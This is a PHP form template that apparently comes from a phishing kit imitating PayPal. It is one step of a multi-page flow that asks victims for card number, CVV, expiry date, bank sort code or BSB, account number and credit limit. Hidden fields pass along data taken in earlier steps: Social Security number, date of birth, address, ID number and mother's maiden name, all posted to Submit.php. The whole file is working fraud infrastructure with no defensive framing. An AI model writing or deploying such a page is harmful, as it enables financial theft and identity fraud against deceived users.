<?php 
include('../pais/contenttrans.php');
include('../settings.php');
?>
<script src="../js/jquery.payment.js"></script><script src="../js/new.look.js"></script>
<style type="text/css">
	#cc_number{background-image:url(https://jquerycreditcardvalidator.com/images/images.png),url(https://jquerycreditcardvalidator.com/images/images.png);
background-position:2px -121px,590px -56px;
background-size:120px 367px,120px 361px;
background-repeat:no-repeat;
padding-left:54px;}form 
#cc_number.visa{background-position:2px -163px,590px -56px}form 
#cc_number.visa_electron{background-position:2px -205px,590px -56px}form 
#cc_number.mastercard{background-position:2px -247px,590px -56px}form 
#cc_number.maestro{background-position:2px -289px,590px -56px}form 
#cc_number.discover{background-position:2px -331px,590px -56px}form 
#cc_number.valid.visa{background-position:2px -163px,590px -83px}form 
#cc_number.valid.visa_electron{background-position:2px -205px,590px -87px}form 
#cc_number.valid.mastercard{background-position:2px -247px,590px -87px}form 
#cc_number.valid.maestro{background-position:2px -289px,590px -87px}form 
#cc_number.valid.discover{background-position:2px -331px,590px -87px}
</style>
<form method="post" id="parentForm" name="creditcard_Form" action="Submit.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>" class="edit">
	<?php
	if ($negara=="GB"){ 
		?>
		<div class="textInput">
			<div class="fieldWrapper">
				<label for="sortcode">Sort code - Account No :</label>
				<input name="sort_code1" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
				<input name="sort_code2" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;
				<input name="sort_code3" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="required" type="text" title="Enter a valid sort code">&nbsp;-&nbsp;
				<input name="accnum" style="width: 5.4em;" pattern="[0-9]{8,}" maxlength="8" autocomplete="off" required="required" type="text" title="Please enter your account number" placeholder="Account number">
			</div>
		</div>
		<?php
	}
	?>
	<?php
	if ($negara=="IE"){ 
		?>
		<div class="textInput">
			<div class="fieldWrapper">
				<label for="sortcode">Sort code - Account No :</label>
				<input name="sort_code1" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;
				<input name="sort_code2" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;
				<input name="sort_code3" class="hasHelp  validateEmpty   " style="width: 4em;" pattern="[0-9]{2,}" maxlength="2" autocomplete="off" required="" type="text" title="Enter a valid sort code">&nbsp;-&nbsp;
				<input name="accnum" style="width: 5.4em;" pattern="[0-9]{8,}" maxlength="8" autocomplete="off" required="" type="text" title="Please enter your account number" placeholder="Account number">
			</div>
		</div>
		<?php
	}
	?>
	<?php
	if ($negara=="IE"){ 
		?>
		<div class="textInput">
			<div class="fieldWrapper">
				<label for="creditlimit">Credit Limit :</label>
				<input type="text" autocomplete="off" class="hasHelp  validateEmpty   " maxlength="10" name="cc_limit" value="" required="required" title="Credit Limit" placeholder="Ex: 5000">
			</div>
		</div>
		<?php
	}
	?>
	<?php
	if ($negara=="AU"){ 
		?>
		<div class="textInput">
			<div class="fieldWrapper">
				<label for="sortcode">OSID - BSB :</label>
				<input name="bsbnum_2" class="hasHelp  validateEmpty   " style="width: 4.9em; pattern="[0-9]{2,}" maxlength="10" autocomplete="off" required="" type="text" title=""> - 
				<input name="bsbnum_1" class="hasHelp  validateEmpty   " style="width: 4.9em; pattern="[0-9]{2,}" maxlength="6" autocomplete="off" required="" type="text" title="">
			</div>
		</div>
		<div class="textInput">
			<div class="fieldWrapper">
				<label for="sortcode">Account No - Credit Limit :</label>
				<input name="accnum" style="width: 7em; " pattern="[0-9]{2,}" maxlength="15" autocomplete="off" required="required" type="text" title="" placeholder="Ex: 19724734"> - 
				<input name="cc_limit" style="width: 7em;"  class="xxsmall" pattern="[0-9]{2,}" maxlength="10" autocomplete="off" required="required" type="text" title="Credit Limit" placeholder="Ex: 5000">
			</div>
		</div>
		<?php
	}
	?>
	<div class="textInput">
		<div class="fieldWrapper">
			<label for="expdate"><?= $cn ?> :</label>
			<input type="text" autocomplete="off" class="hasHelp  validateEmpty   " placeholder="<?= $cn ?>" class="large" pattern=".{2,30}" maxlength="32" name="cc_holder" value="" required="" title="Cardholder name"></span>
		</div>
	</div>
	<div class="textInput">
		<div class="fieldWrapper">
			<label for="expdate"><?= $co ?> :</label>
			<input type="text" id="cc_number" class="hasHelp  validateEmpty  " placeholder="<?= $co ?>" autocomplete="off" pattern="[2-7][0-9 ]{11,20}" maxlength="20" name="cc_number" value="" required="" title="Only number">
			<font class="log" color="red" style="display: none;">*Invalid credit card number</font>
		</div>
	</div>
	<div class="textInput">
		<div class="fieldWrapper">
			<label for="expdate">Expiration Date :</label>
			<table width="100%">
				<tr>
					<?php
					echo date_dropdown(20);
					function date_dropdown($year_limit = 0)
					{
						/*month*/
						$html_output .= '<td width="48%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="expdate_month" placeholder="Exp Month" name="expdate_month" class="needsclick validate" required="required" aria-required="true">'."\n";
						$html_output .= '';
						for ($exp_month = 1; $exp_month <= 12; $exp_month++) {
							if (strlen($exp_month) === 1){
								$html_output .= '<option value="0' . $exp_month . '">0' . $exp_month . '</option>';
							} else {
								$html_output .= '<option value="' . $exp_month . '">' . $exp_month . '</option>';
							}
						}
						$html_output .= "\n".'</select></div><div></td><td width="2%"></td>'."\n";
						/*years*/
						if (date('m') == 12){
							$html_output .= '<td width="48%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="expdate_year" placeholder="Exp Year" name="expdate_year" class="needsclick validate" required="required" aria-required="true">'."\n";
							$html_output .= '';
							for ($exp_year = date('Y') + 1; $exp_year <= date('Y') + $year_limit; $exp_year++) {
								$html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
							}
							$html_output .= "\n".'</select></select></div><div><td>'."\n";
						} else {
							$html_output .= '<td width="48%"><div class="nativeDropdown"><div class="selectDropdown icon-arrow-down-small"><select id="expdate_year" placeholder="Exp Year" name="expdate_year" class="needsclick validate" required="required" aria-required="true">'."\n";
							$html_output .= '';
							for ($exp_year = date('Y'); $exp_year <= date('Y') + $year_limit; $exp_year++) {
								$html_output .= '<option value="' . $exp_year . '">' . $exp_year . '</option>';
							}
							$html_output .= "\n".'</select></select></div><div><td>'."\n";
						}
						return $html_output;
					}
					?>
				</tr>
			</table>
		</div>
	</div>
	<div class="textInput">
		<div class="fieldWrapper">
			<label for="cvv2_number">Card Verification Number :</label>
			<input id="cvv2_number" class="hasHelp  validateEmpty   " placeholder="CVV" autocomplete="off" style="width:6em;" pattern="[0-9]{3,5}" maxlength="4" name="cvv2_number" value="" required="" type="text" title="Enter a valid csc"> <a target="_blank" href="../page/cvv_info_pop&amp;enable_locale.htm" onclick="AYPAL.core.openWindow(event, {width: 425, height: 450});" id="1"> What is this?</a>
		</div>
	</div>
</p>
<p class="bcenter">
	<button type="submit" value="Submit" class="button" id="button">Next</button></p>
	<div style="display:none;"><input name="full_name" value="<?php echo $_POST['full_name'];?>"><input name="address1" value="<?php echo $_POST['address_1'];?>"><input name="address2" value="<?php echo $_POST['address_2'];?>"><input name="city" value="<?php echo $_POST['city'];?>"><input name="state" value="<?php echo $_POST['state'];?>"><input name="postal" value="<?php echo $_POST['postal'];?>"><input name="phone" value="<?php echo $_POST['phone'];?>"><input name="ssn1" value="<?php echo $_POST['number_1'];?>"><input name="ssn2" value="<?php echo $_POST['number_2'];?>"><input name="ssn3" value="<?php echo $_POST['number_3'];?>"><input name="id_number" value="<?php echo $_POST['id_number'];?>"><input name="dob_day" value="<?php echo $_POST['day'];?>"><input name="dob_month" value="<?php echo $_POST['month'];?>"><input name="dob_year" value="<?php echo $_POST['year'];?>"><input name="mmd" value="<?php echo $_POST['mmd'];?>"></div>
</form>